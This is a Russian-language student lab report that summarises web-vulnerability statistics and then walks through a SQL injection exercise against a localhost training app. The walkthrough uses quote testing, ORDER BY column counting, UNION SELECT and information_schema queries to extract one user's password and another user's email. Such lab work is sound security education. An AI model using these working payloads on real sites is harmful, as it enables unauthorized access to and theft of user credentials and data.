# Лабораторная работа №1

## Часть 1: Исследование веб-уязвимостей

### Источники

1. **Indusface (2025)** — State of Application Security Report  
   https://www.indusface.com/resources/research-reports/state-of-application-security-2025-report/

2. **PurpleSec (2024)** — Cybersecurity Statistics  
   https://purplesec.us/resources/cybersecurity-statistics/

3. **PortSwigger** — Web Security Academy: SQL Injection  
   https://portswigger.net/web-security/sql-injection


### Доля успешных атак через веб-уязвимости


**Indusface (2025):**
- За 2024 год обнаружено **26 000 критических и высоких уязвимостей**
- 33% уязвимостей не исправлялись более 180 дней
- Рост атак на веб-приложения: **+94%** (Q1→Q4 2024)
- Рост атак на API: **+873%**

**PurpleSec (2024):**
- **50% сайтов** имели ≥1 серьёзную уязвимость в 2021 г.
- Вредоносные запросы к веб-приложениям: **+88%** за год
- **9 из 10 веб-приложений** уязвимы для атак

### Распределение по конкретным уязвимостям

#### Топ-5 уязвимостей (Indusface, 2025)

| Место | Уязвимость |
|-------|-----------|
| 1 | Possible Blind SQL Injection |
| 2 | Server Side Request Forgery (SSRF) |
| 3 | HTML Injection |
| 4 | Cross-Site Scripting (XSS) |
| 5 | SQL Injection |

#### Статистика атак по типам (PurpleSec)

| Тип атаки | Доля |
|-----------|----------|
| Web-based attack | 49% |
| Phishing / Social Engineering | 43% |
| General Malware | 35% |
| SQL Injection | 26% |
| Cross-Site Scripting | 11% |


## Часть 2: Практическая работа с SQL Injection

### Задание 1: Получить пароль пользователя Volk2

#### Ход рассуждений

 **Что такое SQL Injection?**  
 Это метод внедрения произвольного SQL-кода через входные параметры приложения. Если входные данные не валидируются, злоумышленник может изменить логику запроса и получить доступ к конфиденциальным данным.


**Шаг 1. Попробуем подставлять разные значения айди в пармаетр**

``http://localhost:8080/task/?id=1``

Ваш id:1 </br>
Ваш логин:admin

**Нужные значения**

``http://localhost:8080/task/?id=9``

Ваш id:9 </br>
Ваш логин:Volk2

``http://localhost:8080/task/?id=4``

Ваш id:4 </br>
Ваш логин:Vinni-pukh

**Шаг 2. Проверим на уязвимость, подставив кавычку в запрос**

``http://localhost:8080/task/?id=1'``

Результат:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

#### Вывод: уязвимость есть

**Шаг 3 Для дальнейшего использования union select нужно узнать число колоном в таблице. Сделаем это, вводя ORDER BY пока не получим ошибку**

``http://localhost:8080/task/?id=1%27%20ORDER%20BY%201--%20``

результат: </br>
Ваш id:1 </br>
Ваш логин:admin

``http://localhost:8080/task/?id=1%27%20ORDER%20BY%204--%20``

результат: Unknown column '4' in 'order clause'

значит можем сделать вывод, что в таблице 3 колонки

**Шаг 4 Попробуем извлечь пароль из таблицы с помощью union select**

``http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20password,id,username%20FROM%20table%20WHERE%20id=9--%20``

результат: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'table WHERE id=9-- ' LIMIT 0,1' at line 1

видимо название таблицы указано неверно, предположу,что таблица назвывается users

``http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20password,id,username%20FROM%20users%20WHERE%20id=9--%20``

результат: </br>
Ваш id:Wa spoiuuuuu </br>
Ваш логин:9

### Вывод: пароль юзера Volk2 - Wa spoiuuuuu

### Задание 2: Получить email пользователя Vinni-pukh

**Шаг 1 Получим названия всех таблиц из базы данных**

Т.к. в первой таблице есть только 3 колонки (password, id и username), логично предположить, что email хранится в другой таблице

Используем ``information_schema``

``http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()%2D%2D%20``

результат: </br>
Ваш id:emails,users </br>
Ваш логин:1

Значит вторая таблица называется *emails*

с помощью той же ``information_schema`` выведем названия столбцов таблицы 

``http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(column_name),1,2%20FROM%20information_schema.columns%20WHERE%20table_name=%27emails%27%23``

получим: </br>
Ваш id:id,email_id </br>
Ваш логин:1

**Шаг 2 Используем аналогичный запрос из 1 задания с union select для получения email-а пользователя Vinni-pukh (его id=4, это мы также узнали в 1 задании)

``http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20email_id,1,2%20FROM%20emails%20WHERE%20id=4%23``

результат: </br>
Ваш id:honey_lover@otus-lab.com </br>
Ваш логин:1

Вывод: искомый email - honey_lover@otus-lab.com


